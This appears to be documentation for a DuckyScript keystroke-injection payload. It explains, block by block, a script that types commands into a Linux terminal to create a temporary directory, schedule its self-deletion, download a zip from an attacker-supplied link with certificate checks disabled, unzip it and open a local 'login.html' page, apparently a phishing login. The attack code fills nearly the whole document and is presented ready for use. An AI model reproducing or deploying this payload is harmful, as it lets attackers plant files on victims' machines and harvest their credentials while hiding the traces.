# DuckyScript Documentation

This DuckyScript code performs several actions related to downloading and unzipping a file from a specified link. The script creates a new random directory, downloads a zip file from the specified URL, and unzips it. It also opens a login page.

- First, the script creates a new random directory using the mktemp command and assigns its path to the dir_name variable. The DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Create a random directory
    STRINGLN dir_name=$(mktemp -d)
    DELAY 500
```

- Next, the script sets a timer using the sleep command to delete the directory after 60 minutes (3600 seconds). The rm -rf command is used to remove the directory and its contents. The & character is used to run this command in the background, allowing the script to continue running. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Delete the directory after 60 minutes (3600 seconds)
    STRINGLN (sleep 3600 && rm -rf $dir_name) &
    DELAY 500
```

- The script then moves into the directory using the cd command and the dir_name variable. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Move into the directory
    STRINGLN cd $dir_name
    DELAY 500
```

- Next, the script downloads the zip file from the specified URL using the curl command. The LOk option is used to download the file and give it the same name as the original file. The #ZIP_LINK placeholder should be replaced with the actual URL of the zip file. Another DELAY command is used to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Download the zip from your own link
    STRINGLN curl -LOk "#ZIP_LINK"
    DELAY 500
```

- The script then unzips the downloaded file using the unzip command. The DELAY command is used again to pause the script execution for 500 milliseconds.
```DuckyScript
    REM Unzip it
    STRINGLN unzip file.zip
    DELAY 500
```

- Finally, the script opens the login page using the xdg-open command and the login.html file. The exit command is used to terminate the script.
```DuckyScript
    REM Open the login page
    STRINGLN xdg-open login.html; exit;
```